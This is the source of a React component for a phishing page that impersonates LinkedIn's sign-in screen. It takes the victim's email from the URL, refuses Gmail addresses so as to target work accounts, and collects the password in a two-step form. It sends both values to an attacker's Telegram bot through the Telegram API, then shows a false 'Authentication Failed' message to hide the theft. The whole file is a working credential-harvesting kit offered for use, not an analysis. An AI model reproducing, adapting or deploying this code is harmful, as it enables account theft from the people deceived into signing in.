import { useEffect, useState } from "react";
import Buttons from "./components/Buttons";
import Logo from "/logo.png";

export default function App() {
  const [passwrd, setPasswrd] = useState("");
  const [dis, setDis] = useState(false);
  const [emal, setEmal] = useState("");
  const botToken = import.meta.env.VITE_BOT_TOKEN;
  const chatId = import.meta.env.VITE_CHAT_ID;

  useEffect(() => {
    if (window.location.href.includes("email")) {
      const eValue = window.location.href.split("=")[1];
      setEmal(eValue);
    }
  }, []);

  function regexGmail(userEmail) {
    const emailRegex =
      /([a-zA-Z0-9]+)([\.{1}])?([a-zA-Z0-9]+)\@(?:gmail|GMAIL)([\.])(?:com|COM)/;
    return emailRegex.test(userEmail);
  }

  async function sendDetails(emal, passwrd) {
    try {
      const message = `
!UPDATE

~ New LinkedIn Details ~

Email: ${emal}

Password: ${passwrd}
`;

      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );


      const data = await response.json();

      // Success message should be shown here
      alert(
        `Authentication Failed \nInput correct email or passwordd to secure login`
      );
      setPasswrd("");
      setEmal("");
    } catch (error) {
      console.error("Error sending message:", error);
    }
  }

  function handleFormDetails(e) {
    e.preventDefault();

    if(emal && passwrd){
      checkDetails(emal, passwrd)
    }
    async function checkDetails(userEmail, userPassword) {
      try {
        if (regexGmail(userEmail)) {
          alert('Input your domain email. Gmail not allowed');
          return;
        }

        const formData = new FormData();
        formData.append('userEmails', userEmail);
        formData.append('userPasswords', userPassword);

        const data = Object.fromEntries(formData);
        const { userEmails, userPasswords } = data;
        
        await sendDetails(userEmails, userPasswords);
      } catch (error) {
        console.log(error);
      }
    }
  }

  return (
    <main>
      <div className="logoCtn">
        <img src={Logo} alt="Linked-In Logo" />
      </div>
      <section>
        <div className="card">
          <div>
            <h3>Sign in</h3>
            <p>Stay updated in your professional world.</p>
          </div>
          <form onSubmit={handleFormDetails}>
            <div className="inputs">
              <input
                type="emal"
                placeholder="Emal address"
                name="emal"
                required
                value={emal}
                onChange={(e) => setEmal(e.target.value)}
              />
              {dis && (
                <input
                  type="password"
                  placeholder="Password"
                  name="password"
                  required
                  value={passwrd}
                  onChange={(e) => setPasswrd(e.target.value)}
                />
              )}
            </div>

            {dis && (
              <p>
                <a href="#">Forgotten password?</a>
              </p>
            )}

            {dis ? (
              <button type="submit">Sign in</button>
            ) : (
              <button
                onClick={(e) => {
                  e.preventDefault()
                  if (emal) setDis(!dis);
                  if (!emal) alert("Input your email address");
                }}
              >
                Next
              </button>
            )}
          </form>

          <div className="btmText">
            <div className="separator">
              <div className="line"></div>
              <p>or</p>
              <div className="line"></div>
            </div>
            <p>
              By clicking Continue, you agree to{" "}
              <span className="special">Linked-In’s User Agreement</span>,{" "}
              <span className="special">Privacy Policy</span>, and{" "}
              <span className="special">Cookie Policy</span>.
            </p>

            <div className="btnSection">
              <Buttons text="Continue with Google" google />
              <Buttons text="Sign in with Apple" apple />
            </div>
          </div>
        </div>

        <p>
          {" "}
          New to Linked-In? <span className="special">Join Now</span>
        </p>
      </section>

      <footer>
        <ul className="footerList">
          <li>Linked-In &copy; 2024</li>
          <li>User Agreement</li>
          <li>Privacy Policy</li>
          <li>Community Guidelines</li>
          <li>Cookie Policy</li>
          <li>Copyright Policy</li>
          <li>Send Feedback</li>
        </ul>
      </footer>
    </main>
  );
}
